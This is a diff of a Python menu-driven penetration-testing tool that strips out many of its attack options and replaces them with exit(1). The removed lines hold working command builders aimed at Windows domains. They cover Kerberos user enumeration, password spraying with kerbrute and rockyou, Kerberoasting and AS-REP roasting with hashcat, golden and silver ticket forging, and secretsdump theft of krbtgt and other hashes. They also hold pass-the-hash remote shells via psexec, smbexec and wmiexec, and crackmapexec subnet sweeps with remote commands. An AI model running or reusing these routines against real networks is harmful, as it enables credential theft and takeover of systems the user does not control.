-      if TIP[:5] != "EMPTY":
-         print("")
-         command("\nsmbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
-      else:
-         print("\n[-] Remote IP address has not been specified...")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '39':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command(PATH + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      CheckParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("[*] Enumerating, please wait...")
-         command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
-         command("sed -i '/@/!d' KUSERS.tmp")
-         command("sort KUSERS.tmp | uniq > USERS2.tmp")
-         
-         os.remove("usernames.txt")		# DELETE OLD FILE
-         os.remove("KUSERS.tmp")		# DELETE REDUNDANT FILE
-         command("touch usernames.txt")		# CREATE NEW FILE
-	
-         for x in range(0, MAXX):
-            username = linecache.getline("USERS2.tmp", x + 1)
-            if username != "":
-               username = username.replace("|     ", "")
-               username = username.replace("|_    ", "")
-               username = username.split("@")
-               username = username[0]
-               if username[:1] != " ":							# CONTAINS DATA
-                  USER[x] = username							# ASSIGN USER NAME
-                  command("echo " + USER[x] + " >> usernames.txt")			# EXPORT FOUND USER
-            else:
-               USER[x] = " "*COL3							# ASSIGN EMPTY USER
-            if USER[x][:1] != " ": PASS[x] = "."*COL4					# RESET HASH VALUE
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4)
-
-         os.remove("USERS2.tmp")         
-         print("[+] Found Users...\n")
-         
-         command("tput setaf 2; tput bold")
-         command("cat usernames.txt")
-         command("tput sgr0; tput dim")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
-# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
+# Version : BANK
+# Details : Menu option selected - 
+# Modified: 
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      CheckParams = 0
+      exit(1)
       
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         found = 0
-         print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.txt")
-
-         test1 = linecache.getline("bpassword1.txt", 1)
-         test1 = test1.rstrip("\n")
-         if test1 != "":
-            found = 1
-            USR,PAS = test1.split(":")
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
-
-         if found == 0:
-            print("\n[*] Now trying all usernames with matching passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.txt")
-         
-         test2 = linecache.getline("bpassword2.txt", 1)
-         test2 = test2.rstrip("\n")
-         if test2 != "":
-            found = 1
-            USR,PAS = test2.split(":")
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
-
-         if found == 0:
-            print("\n[*] Now trying user Administrator with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword3.txt")
-    
-         test3 = linecache.getline("bpassword3.txt", 1)
-         test3 = test3.rstrip("\n")
-         if test3 != "":
-            found = 1
-            USR,PAS = test3.split(":")        
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
-
-         if found == 0:
-            print("\n[*] Now trying all users with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword4.txt")
-     
-         test4 = linecache.getline("bpassword4.txt", 1)
-         test4 = test4.rstrip("\n")
-         if test4 != "":
-            USR,PAS = test4.split(":") 
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
-
-         command("rm bpassword*.txt")
-      prompt()
-
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         if linecache.getline('usernames.txt', 1) != " ":
-            command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
-            print("\n[*] Cracking hash values if they exists...\n")
-            command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
-            command("strings cracked1.txt")
-         else:
-            print("[-] The file usernames.txt is empty...")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         if linecache.getline('usernames.txt', 1) != " ":
-            command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
-            print("\n[*] Cracking hash values if they exists...\n")
-            command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
-            command("strings cracked2.txt")
-         else:
-            print("[-] The file usernames.txt is empty...")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
+# Version : BANK
+# Details : Menu option selected -
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1652,421 +1332,150 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
-# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
-
-         if PAS[:1] != "\"":
-            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-         else:
-            if NTM[:1] != "":
-               command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
-               command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-            else:
-               print("[-] User password or hash required...")
-
-         if os.path.exists(USR.rstrip(" ") + ".ccache"):
-            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-         else:
-             print("[-] TGT was not generated...")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Pass the Ticket.
+# Version : BANK
+# Details : Menu option selected -
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      print("\n[*] Sorry, Pass-the-Ticket has not been implemented yet...")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/JERRY
-# Details : Silver Ticket!! 
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
-
-         if (NTM[:1] != "") & (SID[:1] != ""):
-            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
-            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-         else:
-            print("\n[-] Hash or Domain-SID not found...")
-
-         if os.path.exists(USR.rstrip(" ") + ".ccache"):
-            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
-         else:
-             print("\n[-] Silver TGT was not generated...")      
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
-# Details : Golden Ticket!!
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
-
-         if (NTM[:1] != "") & (SID[:1] != ""):
-            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
-            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
-         else:
-            command("echo 'Hash or Domain-SID not found...'")
-
-         if os.path.exists(USR.rstrip(" ") + ".ccache"):
-            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
-         else:
-            print("[-] Golden TGT was not generated...")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
-         command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
-         print("\n[*] Checking downloaded files: \n")
-         command("ls -la ./" + DIR.rstrip(" "))
-      prompt()
+      exit(1)
       
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      CheckParams = 0
-      
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-      
-      if CheckParams != 1:
-         print ("[*] Enumerating, please wait...")     
-         if PAS[:2] != "''":
-            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
-         else:
-            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
-      prompt()
+      exit(1)
          
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         BH1 = input("\n[+] Enter Neo4j username: ")
-         BH2 = input("[+] Enter Neo4j password: ")
-         if BH1 != "" and BH2 != "":
-            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s -dry")
-         else:
-            print("\n[-] Username or password cannot be null...")
-      prompt()
+      exit(1)
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.   if PAS[:2] != "''":
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      CheckParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("Enumerating, please wait...\n")
-         if PAS[:2] != "''":
-            command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
-         else:
-            command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > SECRETS.tmp")
-
-         command("sed -i '/:::/!d' SECRETS.tmp")				# TIDY UP FILE READY FOR READING
-         count = len(open('SECRETS.tmp').readlines())
-
-         cleanusers()         
-         for x in range(0, count):
-            data = linecache.getline("SECRETS.tmp", x + 1)
-            data = data.replace(":::","")				# DELETE THIS LINE?
-            temp = DOM.rstrip(" ") + "\\"				# TIDY UP THE DATA
-            data = data.replace(temp,"")
-            temp = DOM.rstrip(" ") + ".LOCAL\\"
-            data = data.replace(temp,"")
-
-            try:
-               get1,get2,get3,get4 = data.split(":") 
-            except ValueError:
-               if get1 == "":
-                  get1 == "Error..."
-               if get2 == "":
-                  get2 == "Error..."
-               if get3 == "":
-                  get3 == "Error..."
-               if get4 == "":
-                  get4 == "Error..."
-
-            get1 = get1.rstrip("\n")
-            get2 = get1.rstrip("\n")
-            get3 = get1.rstrip("\n")
-            get4 = get4.rstrip("\n")
-
-            print(colored("[+] Found User " + get1,colour2, attrs=['bold']))
-            USER[x] = get1[:COL3]
-            USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
-            PASS[x] = get4[:COL4]         
-            
-            if len(USER[x]) < COL1: USER[x] = padding(USER[x], COL3) 			# USER
-            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
-
-         for z in range(0, MAXX):
-            if USER[z].rstrip(" ") == USR.rstrip(" "):
-               NTM = PASS[z]			# RESET DISPLAY HASH
-               if len(NTM) < COL1: NTM = padding(NTM, COL1)
-
-         os.remove("SECRETS.tmp")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      CheckParams = 0
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         if PAS[:2] != "''":
-            print("[*] Enumerating, please wait...")
-            print("[+] Other exploitable machines on the same subnet...\n")
-            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
-         
-            print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'whoami /all'")
-
-            print("\n[+] Trying to enumerate users and shares...\n")  
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
-         
-            print("\n[+] Trying a few other command while I am here...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
-         else:
-            print("[*] Enumerating, please wait...")          
-            print("[+] Other exploitable machines on the same subnet...\n")
-            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
-         
-            print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'whoami /all'")
-
-            print("\n[+] Trying to enumerate users and shares...\n")  
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --shares")
-         
-            print("\n[+] Trying a few other command while I am here...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -X '$PSVersionTable'")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
-         command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -service-name LUALL.exe") 
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - domain/username:password@<targetName or address
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
-         command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      CheckParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
-         command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
-      prompt()     
+      exit(1)  
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - gpp AES256 Cracker
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2080,8 +1489,8 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Exit(1)
+# Version : BANK
+# Details : Menu option selected - SSH KEYGEN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2101,7 +1510,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2136,7 +1545,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2167,7 +1576,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - NANO usernames.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2182,7 +1591,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - NANO passwords.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2194,7 +1603,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - NANO /etc/hosts
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2206,7 +1615,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - NANO /etc/resolv.conf
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2218,7 +1627,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - HYDRA BRUTE FORCE SSH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2260,7 +1669,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - HYDRA SMB BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2302,7 +1711,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2340,15 +1749,17 @@ while True:
             
       prompt()
       
